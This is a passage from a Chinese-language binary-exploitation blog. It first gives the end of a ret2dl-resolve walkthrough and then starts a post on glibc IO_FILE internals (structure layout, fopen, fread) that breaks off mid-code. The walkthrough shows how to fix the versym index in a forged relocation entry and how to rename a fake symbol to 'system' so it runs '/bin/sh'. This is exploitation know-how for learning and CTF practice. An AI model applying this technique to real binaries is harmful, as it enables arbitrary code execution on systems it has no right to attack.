<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    	version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819213749275.png"
alt="image-20240819213749275" />
<figcaption aria-hidden="true">image-20240819213749275</figcaption>
</figure>
<p>我们依据假符号与符号表的偏移量,计算出r_info,这保证了假重定位项可以索引假符号</p>
<p>但是不能保证r_info索引versym表的什么地方</p>
<p>实际运行时ndx=0x442c</p>
<p>&amp;l-&gt;l_versions=0xf7f5a710</p>
<p>然后versions表里面一项是0x10字节</p>
<p>所以version = &amp;l-&gt;l_versions[ndx]=0xf7f9e9d4;</p>
<p>下一条指令就要解引用了version-&gt;hash</p>
<p>然而0xf7f9e9d4上并没有在任何一个内存映射区,是一个非法地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7f95000</span> <span class="number">0xf7f96000</span> rw-p     <span class="number">1000</span>  <span class="number">32000</span> /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xffb01000</span> <span class="number">0xfff59000</span> rw-p   <span class="number">458000</span>      <span class="number">0</span> [<span class="built_in">stack</span>]</span><br></pre></td></tr></table></figure>
<p>因此对非法地址解引用就段错误了</p>
<p>怎么修复这个过程呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">           version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">           <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">               version = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>假重定位项的r_info既索引假符号表项,又索引假versym表项</p>
<p>如果能控制假versym表项为空,则ndx就是0,此时l_versions[ndx]=l_versions[0]就一定是合法的了</p>
<p>也就是说,我们可以微操控制一下r_info的值</p>
<p>如何控制呢?</p>
<p>原本r_info=0x26807,其中的索引值是0x268</p>
<p>vernum基地址是0x80482d8</p>
<p>vernum[ELFW(R_SYM)(reloc-&gt;r_info)]这个假表项,在0x80482d8+0x268*2=0x080487A8上,使用ida观察这里是.eh_frame段</p>
<p>往下翻找一个全零的假表项位置比如0x080487C2就很好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:080487A8 2C                                            db  2Ch ; ,</span><br><span class="line">	...</span><br><span class="line">.eh_frame:080487C2 00                                            db    0</span><br><span class="line">.eh_frame:080487C3 00                                            db    0</span><br></pre></td></tr></table></figure>
<p>0x080487C2=0x80482d8+index*2</p>
<p>那么index=0x275</p>
<p>那么r_info就得是0x27507</p>
<p>注意如果只修改假的重定位项,令其r_info=0x27507,这样就又不能正确索引到假的符号表项了</p>
<p>按下葫芦浮起瓢,因此还需要修正bss段伪造的假符号位置,在原位置基础上加一个<code>(0x275-0x268)*16</code>即可</p>
<p>乘16的原因是,符号表项一个占用16字节</p>
<h4 id="stage5">stage5</h4>
<p>在本阶段,伪造假符号名字符串,并令假符号的st_name指向它,目的是证明即使st_name远超strtab范围,依然没有任何安全检查阻拦</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820103319870.png"
alt="image-20240820103319870" />
<figcaption aria-hidden="true">image-20240820103319870</figcaption>
</figure>
<h4 id="stage6">stage6</h4>
<p>把stage5中的假符号名字符串改成“system”,并把write的参数(1,“/bin/sh”,“7”)改成system的参数(“/bin/sh”)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820111602402.png"
alt="image-20240820111602402" />
<figcaption aria-hidden="true">image-20240820111602402</figcaption>
</figure>
<h2 id="在目标模块中阴暗地爬行">在目标模块中阴暗地爬行</h2>
<p>分析了<code>_dl_fixup</code>的源码之后,已经能够理解ret2dl-resolve的原理了</p>
<p>下面的问题是,<code>_dl_fixup</code>中调用的<code>_dl_lookup_symbol_x</code>函数,是如何查找符号的呢?</p>
<p>可想而知的是,<code>glibc</code>中的符号成百上千,如果纯纯使用符号名字符串,进行模式匹配,那可真是慢了去了</p>
<p>到底怎么在目标模块中解析符号的呢?</p>
<p><a
target="_blank" rel="noopener" href="https://blogs.oracle.com/solaris/post/gnu-hash-elf-sections">GNU
Hash ELF Sections (oracle.com)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-223668.htm">翻译]GNU Hash ELF
Sections-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h2 id="符号解析中的哈希算法">符号解析中的哈希算法</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve</span><br><span class="line">	_dl_fixup</span><br><span class="line">		_dl_lookup_symbol_x</span><br><span class="line">			do_lookup_x</span><br><span class="line">				do_lookup_unique</span><br><span class="line">					enter_unique_sym</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/IO%20FILE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/IO%20FILE/" class="post-title-link" itemprop="url">IO_FILE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:10:00 / Modified: 23:27:01" itemprop="dateCreated datePublished" datetime="2024-10-17T23:10:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="io-file">IO FILE</h1>
<p>FILE,fopen,fread等函数是glibc为c读写文件准备的数据结构和函数</p>
<blockquote>
<p>linux操作系统也提供了<code>open</code>,<code>read</code>等一系列文件操作函数</p>
<p>两者的区别是,linux这一套系统调用基于文件描述符<code>fd</code>,</p>
<p>但是glibc文件io这一套基于文件指针<code>_IO_FILE*</code>,指向一个<code>FILE</code>对象,这个对象中包装着文件描述符<code>fd</code></p>
</blockquote>
<h2 id="datastructure">datastructure</h2>
<p>FILE相关的声明在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">glibc2.27/libio/libioP.h</span><br><span class="line">glibc2.27/libio/bits/libio.h</span><br></pre></td></tr></table></figure>
<p><code>FILE</code>实际上是<code>_IO_FILE</code>的别名,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/ox <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">int</span> _flags;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">char</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"><span class="comment">/* 0x0070      |  0x0004 */</span>    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="comment">/* 0x0074      |  0x0004 */</span>    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="comment">/* 0x0078      |  0x0008 */</span>    <span class="type">__off_t</span> _old_offset;</span><br><span class="line"><span class="comment">/* 0x0080      |  0x0002 */</span>    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line"><span class="comment">/* 0x0082      |  0x0001 */</span>    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"><span class="comment">/* 0x0083      |  0x0001 */</span>    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0088      |  0x0008 */</span>    _IO_lock_t *_lock;</span><br><span class="line"><span class="comment">/* 0x0090      |  0x0008 */</span>    <span class="type">__off64_t</span> _offset;</span><br><span class="line"><span class="comment">/* 0x0098      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a8      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line"><span class="comment">/* 0x00b0      |  0x0008 */</span>    <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="comment">/* 0x00b8      |  0x0008 */</span>    <span class="type">size_t</span> __pad5;</span><br><span class="line"><span class="comment">/* 0x00c0      |  0x0004 */</span>    <span class="type">int</span> _mode;</span><br><span class="line"><span class="comment">/* 0x00c4      |  0x0014 */</span>    <span class="type">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  216 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>x86_64</code>上,<code>FILE</code>结构体大小为<code>0xd8</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p <span class="title function_">sizeof</span><span class="params">(FILE)</span></span><br><span class="line">$5 = <span class="number">0xd8</span></span><br></pre></td></tr></table></figure>
<p>在glibc中保存了一个全局指针<code>_IO_list_all</code></p>
<p>它指向程序第一个<code>IO_FILE</code>结构体,也就是<code>stderr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  ptype _IO_list_all</span><br><span class="line">type = <span class="keyword">struct</span> _IO_FILE_plus &#123;</span><br><span class="line">    _IO_FILE file;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125; *</span><br><span class="line">gef➤  p &amp;_IO_list_all</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7ffff7dd3660</span> &lt;__GI__IO_list_all&gt;</span><br><span class="line">gef➤  p _IO_list_all</span><br><span class="line">$<span class="number">8</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7ffff7dd3680</span> &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure>
<p>实际上打印其类型时发现并不是一个<code>_IO_FILE</code>,而是一个<code>_IO_FILE_plus</code>,这两者是包含关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>stderr,stdout,stdin</code>,实际上就是三个FILE</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924184530135.png"
alt="image-20240924184530135" />
<figcaption aria-hidden="true">image-20240924184530135</figcaption>
</figure>
<h2 id="algorithm">algorithm</h2>
<h3 id="fopen">fopen</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fopen	_IO_new_fopen @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">87</span></span><br><span class="line">	-&gt;__fopen_internal @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">56</span></span><br><span class="line">		</span><br><span class="line">        new_f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> locked_FILE));		<span class="comment">//locked_FILE = &#123;IO_FILE_plus fp; _IO_lock_t; _IO_wide_data;&#125;</span></span><br><span class="line">		</span><br><span class="line">		_IO_JUMPS	<span class="comment">//new_f-&gt;fp-&gt;vtable = &amp;_IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        -&gt;_IO_new_file_init_internal @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">106</span></span><br><span class="line">            -&gt;_IO_link_in @glibc<span class="number">-2.27</span>/libio/genops.c:<span class="number">86</span></span><br><span class="line">				fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;		<span class="comment">//头插法上链</span></span><br><span class="line">				_IO_list_all = fp;</span><br><span class="line"></span><br><span class="line">		-&gt;_IO_new_file_fopen @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">212</span></span><br><span class="line">            语法分析打开模式(rwa/+xbmce)</span><br><span class="line">            -&gt;_IO_file_open @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">181</span></span><br><span class="line">                -&gt;file._fileno = open() 使用系统调用,返回文件描述符</span><br><span class="line">                -&gt;_IO_link_in										<span class="comment">//实际上已经在_IO_link_in上过链了,哈基米知道已经上链会自己判重的</span></span><br><span class="line">                </span><br><span class="line">        如果_IO_new_file_fopen返回了文件指针fp,说明打开文件成功</span><br><span class="line">        否则-&gt;_IO_un_link 下链然后 <span class="built_in">free</span>(new_f)</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924183957858.png"
alt="file = fopen" />
<figcaption aria-hidden="true">file = fopen</figcaption>
</figure>
<h3 id="fread">fread</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp);</span><br></pre></td></tr></table></figure>
<p>从fp指向的文件,
每次读取size宽度的数据,读取count个单位的数据,到缓冲区buf,
返回实际读取字节数</p>
<h4 id="申请缓冲区">申请缓冲区</h4>
<p>fread包装了read系统调用, 在堆块上建立缓冲区,
一次性使用read读取大量数据到缓冲区,减少多次调用read造成的上下文切换和io开销</p>
<p>第一次调用fread函数,_IO_file_xsgetn首先判断当前FILE是否有缓冲区,如果没有则申请一个,会在堆上要0x1000个字节的堆块,也就是1K的堆块作为缓冲区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br><span class="line">			-&gt;_IO_doallocbuf</span><br><span class="line">				-&gt;_IO_file_doallocate @glibc2<span class="number">.27</span>/libio/filedoalloc.c:<span class="number">77</span></span><br><span class="line">					-&gt;p=<span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line">					-&gt;_IO_setb(_IO_FILE *f=fp, <span class="type">char</span> *b=p, <span class="type">char</span> *eb=p+<span class="number">0x1000</span>, <span class="type">int</span> a=<span class="number">1</span>)	@glibc2<span class="number">.27</span>/libio/genops.c: <span class="number">346</span></span><br><span class="line">						如果fp之前有缓冲区,现在要喜新厌旧了</span><br><span class="line">						fp-&gt;_IO_buf_base=b</span><br><span class="line">						fp-&gt;_IO_buf_end=eb</span><br><span class="line">						<span class="keyword">if</span>(a == <span class="number">1</span>) f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">			</span><br></pre></td></tr></table></figure>
<p>申请缓冲区这部分代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);						<span class="comment">//申请缓冲区去了</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>申请完了后开始读取</p>
<h4 id="读取数据">读取数据</h4>
<p>读取的逻辑是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//have表示当前缓冲区中,剩余字节数</span><br><span class="line">//want表示还剩多少字节需要读,当want降为0时意味着满足了需求</span><br><span class="line"></span><br><span class="line">如果缓冲区余料多于需求,则直接满足</span><br><span class="line">否则</span><br><span class="line">	如果一整个缓冲区的大小足够want则先放到缓冲区然后满足</span><br><span class="line">	否则也就是说一整个缓冲区大小都不够,此时缓冲没有意义了,直接全系统调用满足</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)		<span class="comment">//fp文件指针,data目的地,n总共需要读取的字节数</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t want, have;		<span class="comment">//want剩余想要读取的字节数, have缓冲区剩余的字节数</span></span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span> *s = data;				<span class="comment">//s作为data的迭代器</span></span><br><span class="line"></span><br><span class="line">  want = n;					</span><br><span class="line"></span><br><span class="line"><span class="comment">//此处略去没有缓冲区时申请缓冲区的逻辑</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;				<span class="comment">//直到读取到文件EOF或者满足了want的要求才会跳出循环</span></span><br><span class="line">      	have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;		<span class="comment">//缓冲区末尾与当前指针的距离,就是缓冲区剩余字节数</span></span><br><span class="line">      	<span class="keyword">if</span> (want &lt;= have)&#123;								<span class="comment">//如果缓冲区中余料充足</span></span><br><span class="line">	  		<span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);				</span><br><span class="line">	  		fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  		want = <span class="number">0</span>;									<span class="comment">//已满足要求</span></span><br><span class="line">		&#125; <span class="keyword">else</span>	&#123;										<span class="comment">//否则</span></span><br><span class="line">            	<span class="comment">//如果控制流到此,说明缓冲区余料太少了,不能直接满足want要求</span></span><br><span class="line">	  		<span class="keyword">if</span> (have &gt; <span class="number">0</span>)&#123;								<span class="comment">//如果缓冲区还有余料</span></span><br><span class="line">	      		s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);	<span class="comment">//先把余料吃了再说</span></span><br><span class="line">	      		want -= have;						</span><br><span class="line">	      		fp-&gt;_IO_read_ptr += have;			<span class="comment">//此举导致read_ptr=read_end,缓冲区告罄</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  		<span class="keyword">if</span> (_IO_in_backup (fp))&#123;				<span class="comment">//当上一次刷新缓冲区被中断而没有完成时,上次动作会保存在backup缓冲区,现在要完成未竟之事</span></span><br><span class="line">	      		_IO_switch_to_main_get_area (fp);</span><br><span class="line">	      		<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">//buf是整个缓冲区,而read是当前有效的缓冲区,此举在判断want是否小于整个缓冲区</span></span><br><span class="line">            <span class="comment">//当want小于一整个缓冲区时,刷新缓冲区才有意义,</span></span><br><span class="line">            <span class="comment">//如果want大于一整个缓冲区,那么此时刷新缓冲只会增加io,不如直接syscall read</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (__underflow (fp) == EOF)	<span class="comment">//只有当want小于一整个缓冲区时才会考虑刷新缓冲区</span></span><br><span class="line">					<span class="keyword">break</span>;									</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">            <span class="comment">//缓冲区复位</span></span><br><span class="line">	  		_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  		_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  		count = want;	<span class="comment">//count用于计算需要使用syscall-read进行io的字节数</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base)&#123;</span><br><span class="line">	      		_IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      		<span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">					count -= want % block_size;<span class="comment">//减去最后一个不完整的块大小</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		count = _IO_SYSREAD (fp, s, count);							<span class="comment">//把整数个块直接读出来		</span></span><br><span class="line">	  		<span class="keyword">if</span> (count &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">					